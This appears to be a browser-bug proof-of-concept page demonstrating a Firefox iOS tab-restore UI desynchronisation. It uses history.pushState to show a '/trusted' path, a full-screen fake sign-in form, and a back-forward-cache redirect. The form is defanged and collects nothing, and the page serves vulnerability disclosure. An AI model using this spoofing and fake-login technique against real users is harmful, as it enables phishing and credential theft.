<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Firefox iOS Tab Restore UI Desync — Demo</title>

<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="default">
<meta name="theme-color" content="#ffffff">

<style>
html, body {
  margin: 0;
  height: 100%;
  overflow: hidden;
  font-family: -apple-system, BlinkMacSystemFont, system-ui;
  background: #f5f5f7;
}

button, input {
  -webkit-appearance: none;
  appearance: none;
}

#start {
  margin: 40px auto;
  display: block;
  font-size: 18px;
  padding: 12px 20px;
  border-radius: 12px;
}

#panel {
  display: none;
  position: fixed;
  inset: 0;
  z-index: 999999;
  background: #f5f5f7;
  padding:
    env(safe-area-inset-top)
    20px
    env(safe-area-inset-bottom);
}

.card {
  max-width: 420px;
  margin: 60px auto;
  background: #ffffff;
  padding: 24px;
  border-radius: 16px;
  box-shadow: 0 20px 60px rgba(0,0,0,.2);
}

h2 {
  text-align: center;
  margin-bottom: 6px;
}

.sub {
  text-align: center;
  color: #666;
  margin-bottom: 20px;
}

label {
  display: block;
  font-size: 14px;
  margin-top: 12px;
}

input {
  width: 100%;
  padding: 10px;
  font-size: 16px;
  border-radius: 8px;
  border: 1px solid #ccc;
  margin-top: 6px;
}

.login {
  margin-top: 20px;
  width: 100%;
  padding: 12px;
  font-size: 16px;
  font-weight: 600;
  border-radius: 10px;
  border: none;
  background: #007aff;
  color: #fff;
}

.notice {
  margin-top: 14px;
  font-size: 13px;
  color: #b00020;
  text-align: center;
}
</style>
</head>

<body>

<button id="start">Start PoC</button>

<div id="panel">
  <div class="card">
    <h2>Account Sign-In</h2>
    <div class="sub">Session verification required</div>

    <label>Email</label>
    <input type="email" placeholder="user@example.com">

    <label>Password</label>
    <input type="password" placeholder="••••••••">

    <button class="login" onclick="demoOnly()">Sign in</button>

    <div class="notice">
      Demo only — no data is collected.<br>
      This UI demonstrates browser UI desynchronization.
    </div>
  </div>
</div>

<script>
const panel = document.getElementById('panel');
const start = document.getElementById('start');

function demoOnly() {
  alert(
    'THIS IS NOT REAL\n\n' +
    'No data is collected or transmitted.\n' +
    'This is a UI desync demonstration.'
  );

  document.querySelectorAll('#panel input')
    .forEach(i => i.value = '');
}

start.onclick = () => {
  history.pushState({}, '', '/trusted');
  panel.style.display = 'block';
  document.body.style.overflow = 'hidden';
};

// Tab restore / BFCache timing trigger
window.addEventListener('pageshow', (e) => {
  if (e.persisted) {
    setTimeout(() => {
      location.href = 'https://google.com';
    }, 100);
  }
});
</script>

</body>
</html>
